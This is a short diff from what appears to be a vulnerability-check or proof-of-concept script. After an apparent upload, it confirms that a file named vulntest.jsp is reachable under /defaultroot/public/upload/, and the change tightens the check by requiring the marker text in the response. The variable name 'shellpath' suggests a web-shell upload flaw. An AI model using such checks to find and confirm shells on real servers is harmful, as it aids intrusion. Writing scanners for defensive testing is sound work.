@@ -21,7 +21,7 @@ def verify(site):
     if r.status_code == 200:
         shellpath = site + "/defaultroot/public/upload/vulntest.jsp"
         r2 = requests.get(shellpath, verify=False)
-        if r2.status_code == 200:
+        if r2.status_code == 200 and "vulntest" in r2.text:
             return shellpath
     return ""
     
